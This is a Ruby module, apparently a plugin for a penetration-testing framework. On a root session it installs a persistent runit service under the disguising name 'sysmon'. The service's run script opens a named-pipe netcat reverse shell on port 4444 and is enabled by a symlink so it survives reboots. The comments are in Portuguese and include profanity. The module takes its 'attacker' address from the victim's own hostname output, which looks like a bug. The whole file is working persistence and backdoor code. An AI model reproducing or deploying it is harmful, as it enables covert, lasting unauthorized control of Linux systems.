module RunitReverseShell
  def self.run(fm, sid, client)
    session = fm.sessions[sid]
    return unless session

    begin
      uid = session.shell_command_token('id -u').to_i
      unless uid == 0
        client.print_status("Session #{sid} is not root. Skipping runit service.")
        return
      end
    rescue => e
      client.print_error("Failed to check UID: #{e}")
      return
    end

    svc_name = "sysmon"
    svc_dir  = "/etc/sv/#{svc_name}"
    run_script = "#{svc_dir}/run"
    service_link = "/var/service/#{svc_name}" # algumas distros usam /service/ mas oq eu testei aqui foi esse entao vai esse quem souber contribui ai e que se foda 

    client.print_good("Session #{sid} is root. Deploying runit reverse shell...")

    attacker_ip   = session.shell_command_token("hostname -I | awk '{print $1}'").strip
    attacker_port = 4444

    # Evitar duplicação
    if session.shell_command_token("test -L #{service_link} || test -d #{svc_dir} && echo 'EXISTS'").include?('EXISTS')
      client.print_status("runit service already exists. Skipping.")
      return
    end

    # Payload como script 'run'
    run_content = <<~RUN
      #!/bin/sh
      exec 2>&1
      rm -f /tmp/.r
      mkfifo /tmp/.r
      exec /bin/sh -i < /tmp/.r 2>&1 | nc #{attacker_ip} #{attacker_port} > /tmp/.r
    RUN

    # Comando completo para configurar o serviço
    write_cmd = <<~SHELL
      mkdir -p '#{svc_dir}'
      cat > '#{run_script}' << 'EOF'
      #{run_content}
      EOF
      chmod +x '#{run_script}'
      ln -sf '#{svc_dir}' '#{service_link}' 2>/dev/null || ln -sf '#{svc_dir}' '/service/#{svc_name}' 2>/dev/null
    SHELL

    begin
      session.shell_command(write_cmd)
      client.print_good("runit reverse shell deployed and enabled via symlink!")
    rescue => e
      client.print_error("Failed to deploy runit service: #{e.message}")
    end
  end
end
